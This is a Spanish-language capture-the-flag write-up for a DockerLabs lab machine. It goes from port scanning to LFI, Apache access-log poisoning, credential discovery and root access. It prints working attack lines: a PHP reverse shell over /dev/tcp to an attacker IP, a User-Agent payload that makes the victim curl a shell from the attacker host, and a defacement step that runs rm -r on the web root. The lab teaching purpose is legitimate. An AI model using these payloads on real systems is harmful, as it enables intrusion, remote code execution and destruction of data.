![[20250812213625.png]](veneno-images/20250812213625.png)
# Fase de reconocimiento 

empezamos con un escaneo básico de puertos con nmap 

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
```

una vez hemos descubierto los puertos que son vulnerables vamos a realizar un segundo escaneo pero esta vez con scripts básicos de nmap para sacar el servicio y la versión que corren por detras.

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

![[20250812203847.png]](veneno-images/20250812203847.png)

Vamos a revisar la pagina web para ver que nos encontramos.

![[20250812204001.png]](veneno-images/20250812204001.png)

vemos una pagina de apache pero no nos dice gran cosa asi que vamos a ver que encontramos desde la terminal

con gobuster encontramos lo siguiente

```bash
gobuster dir -u 172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x json,html,php,txt,xml,md
```

![[20250812204131.png]](veneno-images/20250812204131.png)

revisamos los directorios uploads y problems.php

## Uploads

vemos una ventada donde hay archivos. ahora mismo solo esta el html pero en un futuro podremos subir archivos y se verán representados aqui

![[20250812204217.png]](veneno-images/20250812204217.png)

## problems.php

![[20250812204327.png]](veneno-images/20250812204327.png)

aqui volvemos a ver el index a si que de momento no nos sirve de ayuda. como es una pagina PHP vamos a ver si hay algún parámetro expuesto que podamos utilizar para forzar LFI

## Wfuzz

```bash
wfuzz --hw=961 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u "http://172.17.0.2/problems.php?FUZZ=/etc/passwd"
```

![[20250812204519.png]](veneno-images/20250812204519.png)

aqui podemos ver un parametro backdoor vamos a probar en la web si realmente funciona

ponemos esto en la URL:

```bash
http://172.17.0.2/problems.php?backdoor=/etc/passwd
```

![[20250812204636.png]](veneno-images/20250812204636.png)

podemos ver que efectivamente se acontece un LFI asi que vamos a buscar informacion sobre la que atacar.

despues de buscar con diferentes diccionarios de LFI encontramos esto:

```bash
wfuzz --hc=404 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/problems.php?backdoor=FUZZ"
```

![[20250812204821.png]](veneno-images/20250812204821.png)

donde podemos ver dos archivos interesantes "error.log" y "access.log"

vamos a ir a la pagina web de nuevo para comprobar que tenemos visibilidad

En la Url ponemos 

```bash
http://172.17.0.2/problems.php?backdoor=/var/log/apache2/error.log
```
![[20250812204940.png]](veneno-images/20250812204940.png)

efectivamente tenemos visibilidad 

y con el archivo access.log lo que comprobamos es que la pagina se queda cargando durante un rato y aparentemente no hace nada.

![[20250812205032.png]](veneno-images/20250812205032.png)

```bash
http://172.17.0.2/problems.php?backdoor=/var/log/apache2/access.log
```

tras investigar log poisoning he comprobado que el archivo access.log se encarga de registrar y tramitar paquetes y archivos que apuntan al servidor 

y en el archivo error.log podemos ver que esos paquetes los recibe y tramita por la misma ip pero un numero menos 172.17.0.2 - 172.17.0.1

![[20250812205212.png]](veneno-images/20250812205212.png)

# Fase de Explotación

lo primero que vamos a hacer es crear una shell en php al archivo le podéis dar el nombre que queráis yo usare fatality.php

```bash
nano fatality.php
```

y pondremos esto en el archivo 

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.182/443 0>&1'");
?>
```

Tenéis que poner en esta parte estos datos `/dev/tcp/<IP ATACANTE>/<PUERTO QUE VAYAIS A USAR>`

Bien una vez tenemos esto haremos lo siguiente.

```bash
curl -i -v 172.17.0.2 -A "<?php system('curl 172.17.0.1:1112/fatality.php -o /var/www/html/uploads/fatality.php') ; ?>"
```

utilizaremos curl para lanzarle a la ip victima el código php indicado donde la propia maquina victima solicitara a nuestro equipo vía curl nuestra shell.php.

como hemos visto que el archivo access.log utilizaba la IP 172.17.0.1 lo mandaremos por ahi y el puerto indicado es el que nosotros queramos pero tendremos que abrir un http por ese mismo puerto desde nuestra maquina atacante para que la victima tenga acceso a la shell.php después con el parámetro -o le decimos que lo guarde en el directorio uploads que vimos antes

Vamos a explicarlo por pasos 

## Primero

Utilizamos Curl para mandarle la petición al servidor de la victima

```bash
curl -i -v 172.17.0.2 -A "<?php system('curl 172.17.0.1:1112/fatality.php -o /var/www/html/uploads/fatality.php') ; ?>"
```

![[20250812210343.png]](veneno-images/20250812210343.png)
## Segundo

abrimos un puerto http con el mismo numero que indicamos en el php del curl en este caso 1112 pero podeis elegir cualquiera solo tened en cuenta que debe coincidir el puerto del curl con el puerto abierto en http en vuestra maquina de atacante 

```bash
python3 -m http.server 1112
```

![[20250812210321.png]](veneno-images/20250812210321.png)

## Tercero 

volvemos a la pagina web al directorio

```bash
http://172.17.0.2/problems.php?backdoor=/var/log/apache2/error.log
```

![[20250812210436.png]](veneno-images/20250812210436.png)

Cambiamos error.log por access.log pulsamos enter y la pagina empezara a cargar. Lo dejaremos cargar ya que la petición tardara unos 5 minutos aproximadamente este es un punto de tener paciencia nos quedaremos mirando nuestra terminal que esta en el puerto http esperando a que la victima realice la petición 

![[20250812211024.png]](veneno-images/20250812211024.png)

Tras esperar hasta que termine de cargar la pagina recibimos esto por nuestro http en escucha me aparece un archivo fatal.php por que lo resolví así al principio pero para el writeup le cambie el nombre y como access.log guarda todos los archivos y ese ya no existe da error pero esa parte ignorarla. lo importante es que la shell llamada fatality.php que es la que estamos usando en el writeup tiene codigo 200 por lo que se registro exitosamente.

vamos a comprobarlo en el directorio uploads

```bash
http://172.17.0.2/uploads/
```


![[20250812211313.png]](veneno-images/20250812211313.png)

aqui aparece la shell fatality.php por lo que se registro de forma correcta. (como comente antes aparece el registro de fatal.php que es la primera que probe pero esta ignorarla vosotros deberías tener la shell.php que hayáis utilizado solamente)

bien ahora lo que tenemos que hacer es ponernos en escucha con netcat por el puerto asignado en fatality.php en mi caso el 443

![[20250812211502.png]](veneno-images/20250812211502.png)

y en la pagina web pulsamos en fatality.php para ejecutar el php

![[20250812211543.png]](veneno-images/20250812211543.png)

la pagina quedara cargando y por la terminal veremos que tenemos acceso con la shell

![[20250812211608.png]](veneno-images/20250812211608.png)

## tratamiento de la shell

pondremos en la terminal 

```bash
script /dev/null -c bash
```

y pulsamos Ctrl + Z para suspender la shell

en nuestra terminal ponemos 

```bash
stty raw -echo; fg
```

y pulsamos enter 

luego escribimos 

```bash
export TERM=xterm
```

pulsamos enter y ya tendremos una shell con la que trabajar comodos

# Fase de Post Explotación

lo primero utilizaremos 
```bash
ls -l
```

para ver que hay en el directorio actual y veremos que esta el archivo fatality.php

iremos al directorio `/var/www/html`

y hay vemos que hay estos archivos

![[20250812211930.png]](veneno-images/20250812211930.png)

usamos cat para leer el archivo antiguo_y_fuerte.txt

![[20250812211958.png]](veneno-images/20250812211958.png)

y vemos este mensaje nos dice que hay un fichero en el sistema que contiene credenciales validas por lo que vamos a ver si nos podemos hacer con ese archivo 

```bash
find / -name *.txt 2>/dev/null
```

![[20250812212352.png]](veneno-images/20250812212352.png)

hemos encontrado el archivo de la contraseña vamos a leerlo 

![[20250812212421.png]](veneno-images/20250812212421.png)

la contraseña es `pinguinochocolatero`

vamos al directorio `/home` para ver que usuarios tenemos 

![[20250812212508.png]](veneno-images/20250812212508.png)

vemos que hay un usuario carlos tratemos de acceder al usuario con las credenciales carlos:pinguinochocolatero

```bash
su carlos
```

![[20250812212553.png]](veneno-images/20250812212553.png)

vemos que efectivamente existe y la contraseña funciona. 

# Escalada de privilegios

comprobamos permisos de sudoers

```bash
sudo -l
```

pero no funciona y si buscamos con:

```bash
find / -perm -4000 2>/dev/null
```

tampoco hay permisos SUID interesantes 

en el directorio `/home/carlos` encontramos lo siguiente

![[20250812212744.png]](veneno-images/20250812212744.png)

utilizamos 

```bash
ls -Rla
```

para listar lo que hay dentro de cada carpeta incluyendo lo que esta oculto

![[20250812212849.png]](veneno-images/20250812212849.png)

vemos que en la carpeta55 hay una imagen oculta vamos a llevarla a nuestro equipo atacante 

entramos en la carpeta55 y desde ahi vamos a abrir un puerto http para descargarnos desde nuestra maquina lo que hay dentro 

```bash
python3 -m http.server 8081
```

desde nuestra maquina atacante usaremos el comando 

```bash
wget 172.17.0.2:8081/.toor.jpg
```

y ahora usaremos la herramienta exiftool para ver que contiene la imagen 

```bash
exiftool .toor.jpg
```

![[20250812213219.png]](veneno-images/20250812213219.png)

vemos lo que podría ser una credencial la probamos con el usuario root en la maquina victima

```bash
su root
```

![[20250812213405.png]](veneno-images/20250812213405.png)

y ahí tendríamos acceso como root.

# Extra 

vamos a dejar nuestra firma en http como solemos hacer en los CTF de dockerlabs. Una vez somos root haremos 

```bash
cd /var/www/html/
```

```bash
rm -r ./*
```

y ahora en nuestra maquina atacante abrimos un puerto http con python

![[20250812213550.png]](veneno-images/20250812213550.png)

en esta carpeta tengo mi index.html con la imagen panda.png que es la que utilizo para dejar la firma panda2 era otra posible imagen que al final no utilice y proceso son los pasos que os estoy explicando. de esta carpeta lo único que deberíais tener es el index.html personalizado y la imagen que vayáis a utilizar, ahora si abrimos el puerto con python

```bash
python3 -m http.server 8081
```

y en la maquina victima pondremos lo siguiente 

```bash
wget http://192.168.1.182:8081/index.html -O index.html && wget http://192.168.1.182:8081/panda.png -O panda.png
```

![[20250812213539.png]](veneno-images/20250812213539.png)

una vez se confirma la descarga vamos a la pagina http de la victima y recargamos

![[20250812213528.png]](veneno-images/20250812213528.png)

y ahí esta nuestra firma.

si queréis ver el proceso con la creación y código del  html esta en mi writeup de la maquina chocolate de DockerLabs.
